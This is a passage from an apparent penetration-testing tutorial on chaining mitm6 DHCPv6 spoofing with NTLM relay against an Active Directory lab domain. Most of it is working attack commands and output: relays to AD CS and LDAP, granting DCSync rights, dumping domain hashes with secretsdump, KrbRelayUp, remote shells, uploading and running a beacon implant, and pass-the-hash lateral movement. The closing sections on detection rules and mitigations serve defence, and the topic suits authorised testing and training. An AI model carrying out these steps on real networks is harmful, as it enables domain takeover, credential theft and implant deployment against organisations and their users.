**Description:** Instead of relaying to LDAP, we target the AD CS Certificate Authority's web enrollment endpoint (`certsrv/certfnsh.asp`). The `--adcs` flag enables certificate request mode, and `--template Machine` requests a Machine certificate template (use `DomainController` if relaying a DC).

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -6 -t http://CA01.inlanefreight.local/certsrv/certfnsh.asp -wh fakewpad.inlanefreight.local --adcs --template Machine
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Step 3: Wait for Victim Authentication and Certificate Issuance

```
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target http://CA01.inlanefreight.local/certsrv/certfnsh.asp
[*] HTTPD(80): Authenticating against http://CA01.inlanefreight.local/certsrv/certfnsh.asp as INLANEFREIGHT/WS01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 47
[*] Base64 certificate of user WS01$:
MIIRdQIBAzCCET8GCSqGSIb3DQEHAaCCETAEghEsMIIRKDCCBx8GCSqGSIb3DQEHBqCCBxAwggcM
AgEAMIIHBQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIFxMd5jsTvqYCAggAgIIG2JBHaw+X
... <truncated> ...
```

#### Step 4: Use the Certificate with Certipy or Rubeus

```bash
hacker@root[/root]$ certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: ws01$@inlanefreight.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ws01.ccache'
[*] Trying to retrieve NT hash for 'ws01$'
[*] Got NT hash for 'ws01$': 2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c
```

> **ESC8 is extremely powerful** when relaying a Domain Controller's machine account — the issued certificate can be used to perform DCSync and dump all domain hashes. Use `--template DomainController` when relaying a DC.
{: .prompt-danger }

---

### Scenario 5: mitm6 + Domain User Credential Dump (LOOT Mode)

**Use case:** Instead of targeting RBCD, you want to **dump domain information** (users, groups, policies, trusts, etc.) when a machine or user authenticates. The `-l` (lowercase L) flag tells ntlmrelayx to dump LDAP data to a local directory.

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx in Loot Mode

**Description:** The `-l lootme` flag instructs ntlmrelayx to save all enumerated LDAP data to the `lootme` directory upon successful relay. This includes domain users, groups, computers, GPOs, trust relationships, and more.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -6 -t ldaps://172.16.117.3 -wh fakewpad.inlanefreight.local -l lootme
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Step 3: Wait for Authentication and Data Dump

```
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldaps://172.16.117.3
[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Dumping domain info for first time
[*] Domain info dumped into lootme/domain_info_DC01.html
[*] Domain info dumped into lootme/domain_info_DC01.json
```

#### Step 4: Review the Loot

```bash
hacker@root[/root]$ ls -la lootme/
total 4520
drwxr-xr-x 2 root root   4096 Mar 24 11:25 .
drwxr-xr-x 3 root root   4096 Mar 24 11:25 ..
-rw-r--r-- 1 root root 125890 Mar 24 11:25 domain_computers.html
-rw-r--r-- 1 root root  98743 Mar 24 11:25 domain_computers.json
-rw-r--r-- 1 root root  45230 Mar 24 11:25 domain_groups.html
-rw-r--r-- 1 root root  38910 Mar 24 11:25 domain_groups.json
-rw-r--r-- 1 root root 234567 Mar 24 11:25 domain_users.html
-rw-r--r-- 1 root root 198432 Mar 24 11:25 domain_users.json
-rw-r--r-- 1 root root  15678 Mar 24 11:25 domain_policy.html
-rw-r--r-- 1 root root  12340 Mar 24 11:25 domain_policy.json
-rw-r--r-- 1 root root   8765 Mar 24 11:25 domain_trusts.html
-rw-r--r-- 1 root root   6543 Mar 24 11:25 domain_trusts.json
-rw-r--r-- 1 root root 345678 Mar 24 11:25 domain_info_DC01.html
-rw-r--r-- 1 root root 289012 Mar 24 11:25 domain_info_DC01.json
```

```bash
hacker@root[/root]$ cat lootme/domain_users.json | python3 -m json.tool | head -30
[
    {
        "sAMAccountName": "Administrator",
        "description": "Built-in account for administering the computer/domain",
        "memberOf": [
            "CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local",
            "CN=Enterprise Admins,CN=Users,DC=inlanefreight,DC=local"
        ],
        "userAccountControl": 512,
        "lastLogon": "2026-03-23 15:30:45"
    },
    {
        "sAMAccountName": "j.smith",
        "description": "IT Support",
        "memberOf": [
            "CN=IT-Support,OU=Groups,DC=inlanefreight,DC=local",
            "CN=Remote Desktop Users,CN=Builtin,DC=inlanefreight,DC=local"
        ],
        "userAccountControl": 512,
        "lastLogon": "2026-03-24 08:15:22"
    }
]
```

> This scenario is perfect for **reconnaissance**. Even if you don't want to modify anything in AD, you can passively collect domain data. Combine this with tools like BloodHound to map attack paths.
{: .prompt-tip }

---

### Scenario 6: mitm6 + Interactive LDAP Shell

**Use case:** You want **manual control** over what happens after the relay, rather than automatic RBCD configuration. The interactive LDAP shell lets you browse the directory, create accounts, set RBCD, read LAPS passwords, grant ACLs, and more.

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx in Interactive Mode

**Description:** The `-i` flag starts an interactive LDAP shell on a local TCP port whenever a relay succeeds. You can then connect to it with netcat and issue LDAP commands manually.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -6 -t ldap://172.16.117.3 -wh fakewpad.inlanefreight.local -i
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Step 3: Wait for Relay and Interactive Shell

```
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/WS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as INLANEFREIGHT/WS01$
```

#### Step 4: Connect to the Interactive LDAP Shell

**Description:** Use netcat to connect to the interactive LDAP shell and execute commands as the relayed machine account.

```bash
hacker@root[/root]$ nc 127.0.0.1 11000
Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.
```

#### Step 5: Manually Configure RBCD

```bash
# add_computer YOURCOMPUTER P@ssw0rd!
Attempting to add computer YOURCOMPUTER$ with password P@ssw0rd!...
Adding new computer with username: YOURCOMPUTER$ and password: P@ssw0rd! result: OK

# set_rbcd WS01$ YOURCOMPUTER$
Found Target DN: CN=WS01,CN=Computers,DC=inlanefreight,DC=local
Target SID: S-1-5-21-3842939050-3880317879-2865463114-1105

Found Grantee DN: CN=YOURCOMPUTER,CN=Computers,DC=inlanefreight,DC=local
Grantee SID: S-1-5-21-3842939050-3880317879-2865463114-7601

Delegation rights modified successfully!
YOURCOMPUTER$ can now impersonate users on WS01$ via S4U2Proxy
```

#### Step 6: (Optional) Read LAPS Passwords

```bash
# get_laps_password WS01
Found LAPS password for WS01: xK#9mP$2qR!wY7nT
LAPS password expiration: 2026-04-15 00:00:00
```

#### Step 7: (Optional) Grant Full Control

```bash
# grant_control WS01$ YOURCOMPUTER$
Granting full control of WS01$ to YOURCOMPUTER$
DACL modified successfully!
```

> The interactive LDAP shell is extremely powerful for complex scenarios where you need fine-grained control. You can read LAPS passwords, modify GPO DACLs, add users to groups, and perform many other operations that the automated modes don't support.
{: .prompt-tip }

---

### Scenario 7: mitm6 + DCSync Rights (Domain Admin Relay)

**Use case:** If a **Domain Admin** (or any high-privileged user) triggers the WPAD authentication (e.g., by opening a browser on a poisoned machine), you can relay their credentials to LDAP and **grant yourself DCSync rights** — enabling you to dump the entire domain's password hashes.

> This scenario requires a **Domain Admin or equivalent privileged user** to authenticate through the poisoned WPAD proxy. You cannot grant DCSync rights using a regular machine account relay — the relayed account must have sufficient privileges to modify ACLs on the domain object.
{: .prompt-warning }

#### Step 1: Start mitm6

```bash
hacker@root[/root]$ sudo mitm6 -d inlanefreight.local --no-ra
Starting mitm6 using interface eth0
IPv4 address: 172.16.117.100
IPv6 address: fe80::a00:27ff:fe4e:66a1
MAC address: 08:00:27:4e:66:a1
WARNING: Running mitm6 for extended periods can cause network issues. Use in 5-10 minute sprints.

Listening for DHCPv6 multicasts...
```

#### Step 2: Start ntlmrelayx with --escalate-user for DCSync

**Description:** The `--escalate-user` flag (when used without `--delegate-access`) tells ntlmrelayx to grant DCSync replication rights (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`) to the specified user account when a sufficiently privileged relay comes in.

```bash
hacker@root[/root]$ sudo ntlmrelayx.py -6 -t ldap://172.16.117.3 -wh fakewpad.inlanefreight.local --escalate-user hacker
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

#### Step 3: Domain Admin Triggers WPAD Authentication

```
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving PAC file to client ::ffff:172.16.117.10
[*] HTTPD(80): Connection from ::ffff:172.16.117.10 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/dadmin SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user, modify ACL
[*] User privileges found: Domain Admin!
[*] Attempting to escalate user hacker with DCSync rights
[*] Modifying domain DACL to give DCSync rights to hacker
[+] Success! User hacker now has Replication rights on the domain!
[*] Try running secretsdump.py to DCSync
```

#### Step 4: Perform DCSync and Dump All Domain Hashes

```bash
hacker@root[/root]$ secretsdump.py 'INLANEFREIGHT/hacker:Password123@172.16.117.3'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x00000005 - ERROR_ACCESS_DENIED
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3d45d77b62d480e0d8e54016456b3f18:::
INLANEFREIGHT.LOCAL\j.smith:1103:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
INLANEFREIGHT.LOCAL\m.jones:1104:aad3b435b51404eeaad3b435b51404ee:87d3a0e5b92f1c4d6e8a0b3c5d7f9e2a:::
INLANEFREIGHT.LOCAL\svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:4b9a7e3c8d2f1a5e6b0c9d8e7f3a2b1c:::
INLANEFREIGHT.LOCAL\dadmin:1106:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c:::
WS01$:1105:aad3b435b51404eeaad3b435b51404ee:f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1:::
SRV01$:1106:aad3b435b51404eeaad3b435b51404ee:9d8c7b6a5f4e3d2c1f0e9d8c7b6a5f4e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
krbtgt:aes256-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
[*] Cleaning up...
```

> **Game over.** With DCSync rights, you now have every password hash in the domain, including the `krbtgt` hash (Golden Ticket) and all Domain Admin hashes. This is **full domain compromise**.
{: .prompt-danger }

---

### Scenario 8: mitm6 from a Windows Attack Machine

**Use case:** While mitm6 itself is a Python/Linux tool, similar attacks can be performed from a **Windows attack machine** using native tools. This is useful when you're operating from a compromised Windows workstation and can't run Linux tools.

#### Approach A: Inveigh (PowerShell/C# — DHCPv6 + WPAD + NTLM Capture)

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a Windows-native tool (PowerShell and C#) that can perform DHCPv6 spoofing, WPAD serving, and NTLM hash capture — similar to mitm6 + Responder combined.

#### Step 1: Import and Run Inveigh with DHCPv6 and WPAD

```powershell
PS C:\Tools> Import-Module .\Inveigh.ps1
PS C:\Tools> Invoke-Inveigh -ConsoleOutput Y -DHCPv6 Y -WPAD Y -WPADAuth Anonymous -IP 172.16.117.50
[*] Inveigh 1.506 started at 2026-03-24T11:30:00
[+] Listening on:
    DHCPv6 UDP 547
    HTTP   TCP 80
    HTTPS  TCP 443
    SMB    TCP 445

[+] WPAD = Enabled (Auth: Anonymous)
[+] DHCPv6 = Enabled
[+] Primary IP Address = 172.16.117.50
[+] LLMNR/NBNS/mDNS spoofer started
[+] DHCPv6 spoofer started
```

#### Step 2: Wait for NTLM Hashes

```powershell
[+] [2026-03-24T11:32:15] DHCPv6 response sent to fe80::7405:91a2:c3b1:248f (WS01)
[+] [2026-03-24T11:32:16] HTTP(80) NTLMv2 captured for INLANEFREIGHT\j.smith from 172.16.117.10(WS01):
    j.smith::INLANEFREIGHT:1122334455667788:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6:0101000000000000...
```

#### Step 3: Crack or Relay the Captured Hashes

```powershell
PS C:\Tools> Get-Inveigh -NTLMv2
j.smith::INLANEFREIGHT:1122334455667788:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6:0101000000000000...
```

> Inveigh captures NTLM hashes rather than relaying them. For relay functionality on Windows, you'd need additional tools or a modified setup.
{: .prompt-info }

#### Approach B: KrbRelayUp — Local RBCD Privilege Escalation

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) automates the entire RBCD attack chain **on the local machine** — no mitm6 needed. It creates a machine account, configures RBCD, performs S4U2Self/S4U2Proxy, and gets a SYSTEM ticket — all in one command.

#### Step 1: Run KrbRelayUp

```powershell
PS C:\Tools> .\KrbRelayUp.exe relay -Domain inlanefreight.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword "P@ssw0rd!"
KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] CLSID: d99e6e73-fc88-11d0-b498-00a0c90312f3
[+] Type: System.Runtime.Remoting.ObjRef
[+] Using OXID resolver
[+] Triggering authentication...
[+] Got Krb Auth from NT/SYSTEM. Relaying...
[+] Creating new computer account YOURPC$...
[+] Computer account created successfully!
[+] Configuring RBCD on WS01$ for YOURPC$...
[+] RBCD configured successfully!
[+] Getting SYSTEM TGS...
[+] Got SYSTEM TGS for cifs/ws01.inlanefreight.local!
[+] Impersonating SYSTEM using S4U2Proxy...
[+] Ticket saved to kirbi file: system_ticket.kirbi
```

#### Step 2: Use the Ticket with Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe ptt /ticket:system_ticket.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

```powershell
PS C:\Tools> dir \\ws01.inlanefreight.local\C$
 Volume in drive \\ws01.inlanefreight.local\C$ has no label.
 Volume Serial Number is 1A2B-3C4D

 Directory of \\ws01.inlanefreight.local\C$

03/24/2026  09:00 AM    <DIR>          Program Files
03/24/2026  09:00 AM    <DIR>          Program Files (x86)
03/24/2026  09:00 AM    <DIR>          Users
03/24/2026  09:00 AM    <DIR>          Windows
               0 File(s)              0 bytes
               4 Dir(s)  42,123,456,789 bytes free
```

#### Approach C: DavRelayUp — RBCD via WebDAV Relay

[DavRelayUp](https://github.com/Dec0ne/DavRelayUp) is similar to KrbRelayUp but uses the WebDAV client to trigger NTLM authentication, which can then be relayed to LDAP for RBCD configuration.

```powershell
PS C:\Tools> .\DavRelayUp.exe -d inlanefreight.local -cn DAVPC$ -cp "P@ssw0rd!"
[+] Checking for WebClient service...
[+] WebClient service is running!
[+] Creating computer account DAVPC$...
[+] Triggering WebDAV NTLM authentication...
[+] Relaying to LDAP...
[+] Configuring RBCD...
[+] RBCD configured successfully!
[+] Requesting service ticket via S4U...
[+] Got SYSTEM ticket! Saved to davrelayup.kirbi
```

> **Windows attack tools summary:** Use **Inveigh** for DHCPv6/WPAD/NTLM capture. Use **KrbRelayUp** for local privilege escalation via RBCD without network poisoning. Use **DavRelayUp** when the WebClient service is available. Each tool has different prerequisites and noise levels.
{: .prompt-info }

---

## Post-Exploitation After RBCD

Once you've successfully obtained a service ticket via the S4U2Proxy attack, you have multiple avenues for exploitation.

### Remote Shell Access

You can use any of the Impacket execution tools with your Kerberos ticket:

**psexec.py** — Creates a service for execution (most reliable, but noisier):

```bash
hacker@root[/root]$ export KRB5CCNAME=Administrator@cifs_ws01.inlanefreight.local@INLANEFREIGHT.LOCAL.ccache
hacker@root[/root]$ psexec.py -k -no-pass ws01.inlanefreight.local
```

**smbexec.py** — Uses a service for execution via SMB (slightly stealthier):

```bash
hacker@root[/root]$ smbexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32> whoami
nt authority\system
```

**wmiexec.py** — Uses WMI for execution (stealthiest, no service creation):

```bash
hacker@root[/root]$ wmiexec.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
inlanefreight\administrator
```

### Credential Dumping

```bash
hacker@root[/root]$ secretsdump.py -k -no-pass ws01.inlanefreight.local
```

This dumps:
- **SAM hashes** — Local account password hashes
- **LSA secrets** — Machine account passwords, service account credentials, cached domain logon information
- **DPAPI keys** — Can decrypt saved credentials, browser passwords, etc.

### SMB File Access

```bash
hacker@root[/root]$ smbclient.py -k -no-pass ws01.inlanefreight.local
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

Type help for list of commands
# shares
ADMIN$
C$
IPC$
Users
SharedDocs
# use C$
# ls
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 .
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 ..
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 PerfLogs
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 Program Files
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 Program Files (x86)
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 Users
drw-rw-rw-          0  Tue Mar 24 09:00:00 2026 Windows
```

### Upload Beacon/Implant

With ADMIN$ write access, you can upload any payload:

```bash
hacker@root[/root]$ smbclient.py -k -no-pass ws01.inlanefreight.local
# use ADMIN$
# put beacon.exe
# exit
hacker@root[/root]$ wmiexec.py -k -no-pass ws01.inlanefreight.local "C:\Windows\beacon.exe"
```

### Lateral Movement from Captured Hashes

Once you have local admin hashes from secretsdump, use Pass-the-Hash to move laterally:

```bash
hacker@root[/root]$ nxc smb 172.16.117.0/24 -u Administrator -H 'e19ccf75ee54e06b06a5907af13cef42' --local-auth
SMB         172.16.117.10   445    WS01             [+] WS01\Administrator:e19ccf75ee54e06b06a5907af13cef42 (Pwn3d!)
SMB         172.16.117.20   445    SRV01            [+] SRV01\Administrator:e19ccf75ee54e06b06a5907af13cef42 (Pwn3d!)
SMB         172.16.117.25   445    WS02             [-] WS02\Administrator:e19ccf75ee54e06b06a5907af13cef42 STATUS_LOGON_FAILURE
```

### DCSync (If DC Machine Account Compromised)

If you managed to relay a Domain Controller's machine account and obtain its hash, you can potentially perform DCSync:

```bash
hacker@root[/root]$ secretsdump.py -hashes :2c8f9a3b5d1e4f7a8b0c9d2e3f5a6b7c 'INLANEFREIGHT/DC01$@172.16.117.3'
Impacket v0.12.0.dev1 - Copyright 2024 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3d45d77b62d480e0d8e54016456b3f18:::
...
```

---

## Related CVEs

The mitm6 + NTLM relay attack chain intersects with several important CVEs that either enhance the attack, provide alternative coercion methods, or represent patches that mitigate parts of the chain.

| CVE | Name | Description | Impact on mitm6 Attack |
|---|---|---|---|
| **CVE-2018-8581** | Exchange SSRF | Exchange SSRF allows relaying Exchange credentials to LDAP for privilege escalation (PrivExchange) | Combine with mitm6 for Exchange credential relay; Exchange authenticates as SYSTEM |
| **CVE-2019-1040** | Drop the MIC | Allows removal of NTLM Message Integrity Code, enabling SMB-to-LDAP relay | Bypasses NTLM signing protections, allows relaying SMB auth to LDAP — dramatically expands relay targets |
| **CVE-2019-1166** | Drop the MIC 2 | Second bypass for the MIC protection after initial patch | Further bypass of NTLM relay protections even after CVE-2019-1040 patch |
| **CVE-2020-17049** | Bronze Bit | Bypass for Protected Users delegation restrictions via S4U2Self forwardable flag manipulation | Allows impersonation of accounts in the Protected Users group during S4U2Proxy, which normally blocks delegation |
| **CVE-2021-36942** | PetitPotam | Unauthenticated coercion via MS-EFSRPC (EFS) | Provides an alternative coercion method to trigger NTLM authentication from DCs; combine with mitm6 for enhanced reliability |
| **CVE-2022-26925** | LSA Spoofing | PetitPotam variant allowing unauthenticated LSA coercion | Another coercion vector that can be combined with NTLM relay |
| **CVE-2021-42278** | noPac (sAMAccountName) | Allows computer account name impersonation | Alternative privilege escalation path — rename machine account to DC name, request TGT, rename back, request ST |
| **CVE-2021-42287** | noPac (S4U) | S4U2Self confusion when sAMAccountName doesn't match | Combined with CVE-2021-42278 for direct DC impersonation without RBCD |

> Many of these CVEs have been patched, but **not all organizations apply patches promptly**. During a pentest, always check the patch level of targets. Even one unpatched DC can be the key to domain compromise.
{: .prompt-warning }

---

## Detection and Monitoring

Effective detection of the mitm6 + NTLM relay + RBCD attack chain requires monitoring at multiple layers: network, Active Directory, and endpoint.

### Active Directory Event Logs

| Event ID | Log Source | What to Monitor |
|---|---|---|
| **4741** | Security | New computer account creation — alert on random names (AADDKXBP$, QRMZHUKR$, etc.) |
| **4720** | Security | New user account creation (if attacker creates users via LDAP shell) |
| **4769** | Security | Kerberos Service Ticket requests — look for S4U2Proxy/S4U2Self ticket types |
| **5136** | Security (DC) | Directory service object modification — monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes |
| **5136** | Security (DC) | Directory service object modification — monitor `msDS-KeyCredentialLink` changes (Shadow Credentials) |
| **4662** | Security (DC) | DS-Replication-Get-Changes operations — detect DCSync |

### Network-Level Detection

**Rogue DHCPv6 Server Detection:**

- Deploy **Zeek** (formerly Bro) rules to monitor for unexpected DHCPv6 Advertise messages
- Use **Suricata** rules to alert on DHCPv6 traffic from non-authorized servers
- Enable **DHCPv6 Guard** on managed switches to block rogue DHCPv6 servers

**WPAD Anomalies:**

```
alert dns any any -> any 53 (msg:"Suspicious WPAD DNS query"; content:"wpad"; nocase; sid:1000001; rev:1;)
```

**NTLM Relay Indicators:**

- Monitor for HTTP NTLM authentication to internal IPs that don't normally serve as proxies
- Look for LDAP binds from unexpected source IPs (the attacker's machine binding to LDAP using a workstation's account)

### Anomaly Detection

- **Random machine account names:** Legitimate machine accounts follow naming conventions (e.g., `WS01$`, `SRV-DB-01$`). Accounts like `AADDKXBP$` or `QRMZHUKR$` are highly suspicious.
- **Multiple machine accounts in short time:** Detect when a single source creates multiple machine accounts within minutes.
- **Machine account creating machine accounts:** Monitor for one computer account creating another — this is unusual in normal operations.
- **RBCD modification on workstations:** Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` on workstation objects are rarely legitimate.
- **KeyCredentialLink modifications:** Computer objects updating their own `msDS-KeyCredentialLink` is normal for Windows Hello for Business, but modifications from other accounts are suspicious.

### Sample Detection Queries

**Sigma Rule — RBCD Modification:**

```yaml
title: RBCD Attribute Modification
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects modification of msDS-AllowedToActOnBehalfOfOtherIdentity attribute
logsource:
    product: windows
    service: security
    definition: Requires Directory Service Changes auditing
detection:
    selection:
        EventID: 5136
        AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
    condition: selection
level: high
tags:
    - attack.persistence
    - attack.t1134
```

**KQL Query (Microsoft Sentinel) — Suspicious Machine Account Creation:**

```kql
SecurityEvent
| where EventID == 4741
| where TargetUserName matches regex @"^[A-Z]{8}\$$"
| project TimeGenerated, Computer, TargetUserName, SubjectUserName, SubjectDomainName
| sort by TimeGenerated desc
```

---

## Mitigations and Defenses

### Network-Level Defenses

#### 1. Block DHCPv6 Traffic via Windows Firewall GPO

This is the **most effective single mitigation** for mitm6. Deploy these firewall rules via Group Policy to all domain computers:

- **Block Inbound:** Core Networking — Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)
- **Block Inbound:** Core Networking — Router Advertisement (ICMPv6-In)
- **Block Outbound:** Core Networking — Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)

GPO Path: `Computer Configuration → Windows Settings → Security Settings → Windows Defender Firewall with Advanced Security`

> **Do NOT disable IPv6 entirely.** Microsoft and many AD components expect IPv6 to be present. Instead, block only DHCPv6 and Router Advertisements via firewall rules, which prevents the attack without breaking IPv6 loopback or other needed functionality.
{: .prompt-warning }

#### 2. Disable IPv6 Router Discovery via PowerShell

For immediate remediation (deploy via SCCM, Intune, or GPO startup script):

```powershell
PS C:\Tools> Get-NetIPInterface -AddressFamily IPv6 | ForEach-Object {
